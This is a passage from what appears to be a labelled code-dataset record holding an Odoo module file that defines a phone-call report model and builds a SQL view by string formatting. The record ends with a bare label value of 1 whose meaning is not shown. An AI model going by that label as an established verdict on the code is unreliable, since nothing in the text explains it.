self.env[\n                'crm.phonecall'].search_count(\n                [('opportunity_id', '=', lead.id)])\n/n/n/n/crm_phonecall/report/crm_phonecall_report.py/n/n# -*- coding: utf-8 -*-\n# Copyright 2004-2010 Tiny SPRL (<http://tiny.be>)\n# Copyright 2017 Tecnativa - Vicent Cubells\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl).\n\nfrom odoo import tools\nfrom odoo import api, fields, models\n\nAVAILABLE_STATES = [\n    ('draft', 'Draft'),\n    ('open', 'Todo'),\n    ('cancel', 'Cancelled'),\n    ('done', 'Held'),\n    ('pending', 'Pending')\n]\n\n\nclass CrmPhonecallReport(models.Model):\n    _name = \"crm.phonecall.report\"\n    _description = \"Phone calls by user\"\n    _auto = False\n\n    user_id = fields.Many2one(\n        comodel_name='res.users',\n        string='User',\n        readonly=True,\n    )\n    team_id = fields.Many2one(\n        comodel_name='crm.team',\n        string='Team',\n        readonly=True,\n    )\n    priority = fields.Selection(\n        selection=[\n            ('0', 'Low'),\n            ('1', 'Normal'),\n            ('2', 'High')\n        ],\n        string='Priority',\n    )\n    nbr_cases = fields.Integer(\n        string='# of Cases',\n        readonly=True,\n    )\n    state = fields.Selection(\n        AVAILABLE_STATES,\n        string='Status',\n        readonly=True,\n    )\n    create_date = fields.Datetime(\n        string='Create Date',\n        readonly=True,\n        index=True,\n    )\n    delay_close = fields.Float(\n        string='Delay to close',\n        digits=(16, 2),\n        readonly=True,\n        group_operator=\"avg\",\n        help=\"Number of Days to close the case\",\n    )\n    duration = fields.Float(\n        string='Duration',\n        digits=(16, 2),\n        readonly=True,\n        group_operator=\"avg\",\n    )\n    delay_open = fields.Float(\n        string='Delay to open',\n        digits=(16, 2),\n        readonly=True,\n        group_operator=\"avg\",\n        help=\"Number of Days to open the case\",\n    )\n    partner_id = fields.Many2one(\n        comodel_name='res.partner',\n        string='Partner',\n        readonly=True,\n    )\n    company_id = fields.Many2one(\n        comodel_name='res.company',\n        string='Company',\n        readonly=True,\n    )\n    opening_date = fields.Datetime(\n        readonly=True,\n        index=True,\n    )\n    date_closed = fields.Datetime(\n        string='Close Date',\n        readonly=True,\n        index=True)\n\n    def _select(self):\n        select_str = \"\"\"\n            select\n                id,\n                c.date_open as opening_date,\n                c.date_closed as date_closed,\n                c.state,\n                c.user_id,\n                c.team_id,\n                c.partner_id,\n                c.duration,\n                c.company_id,\n                c.priority,\n                1 as nbr_cases,\n                c.create_date as create_date,\n                extract(\n                  'epoch' from (\n                  c.date_closed-c.create_date))/(3600*24) as delay_close,\n                extract(\n                  'epoch' from (\n                  c.date_open-c.create_date))/(3600*24) as delay_open\n           \"\"\"\n        return select_str\n\n    def _from(self):\n        from_str = \"\"\"\n            from crm_phonecall c\n        \"\"\"\n        return from_str\n\n    @api.model_cr\n    def init(self):\n\n        tools.drop_view_if_exists(self._cr, self._table)\n        self._cr.execute(\"\"\"\n            create or replace view %s as (\n                %s\n                %s\n            )\"\"\" % (self._table, self._select(), self._from()))\n/n/n/n", "label": 1}]